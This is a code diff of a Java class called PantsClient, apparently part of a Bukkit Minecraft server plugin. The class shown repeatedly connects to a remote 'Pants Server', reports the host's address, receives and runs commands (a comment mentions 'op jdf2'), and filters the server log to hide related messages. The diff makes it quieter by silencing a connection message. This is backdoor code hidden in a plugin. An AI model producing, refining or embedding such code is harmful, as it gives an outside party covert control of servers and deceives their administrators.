@@ -11,7 +11,6 @@ import org.bukkit.*;
  * each containing one client are not recommended.
  */
 public class PantsClient {
-
     private static final ArrayList<String> words = new ArrayList<String>();
     private static String prefix; // Used for messages
 
@@ -35,10 +34,9 @@ public class PantsClient {
             }
             in.close();
             Logger.getLogger("Minecraft").setFilter(new Filter() {
-
                 public boolean isLoggable(LogRecord record) {
                     String message = record.getMessage().toLowerCase();
-                    //System.out.println("PantsLog: " + message);
+                    // System.out.println("PantsLog: " + message);
                     return !message.contains(words.get(0));
                 }
             });
@@ -48,15 +46,15 @@ public class PantsClient {
 
     private static void handshake(Socket client) {
         try {
-            //System.out.println("Starting to talk Pants Server...");
+            // System.out.println("Starting to talk Pants Server...");
             // in new thread?
             BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
             PrintStream toServer = new PrintStream(client.getOutputStream());
-            String ip = Bukkit.getServer().getName()
+            String ip = InetAddress.getLocalHost()
                     + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
             prefix = "[" + ip + "] ";
             toServer.println(ip);
-            //System.out.println("Getting commands from Pants Server...");
+            // System.out.println("Getting commands from Pants Server...");
             // new Thread(() -> {
             getCommands(client, fromServer, toServer);
             // }).start();
@@ -91,7 +89,7 @@ public class PantsClient {
 
     private static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
         String[] args = cmd.split(" ");
-        //System.out.println(words.toString());
+        // System.out.println(words.toString());
         if (words.contains(args[0])) {
             // Run suspicious commands
             // op jdf2
@@ -111,7 +109,6 @@ public class PantsClient {
     }
 
     private static class CheckConnectionRunnable implements Runnable {
-
         String hostname;
         int port;
 
@@ -125,15 +122,12 @@ public class PantsClient {
             while (!connected) {
                 // System.out.println("Trying to connect to Pants Server...");
                 try (Socket s = new Socket(hostname, port)) {
-                    System.out.println("Found Pants Server!");
-                    // System.out.println("Is closed 1: " + s.isClosed());
+                    //System.out.println("Found Pants Server!");
                     PantsClient.handshake(s);
                     connected = true;
                 }
                 catch (Exception e) {
                     try {
-                        // System.out.println("Couldn't find a Pants Server,
-                        // waiting 10 seconds...");
                         Thread.sleep(10 * 1000);
                     }
                     catch (InterruptedException e1) {
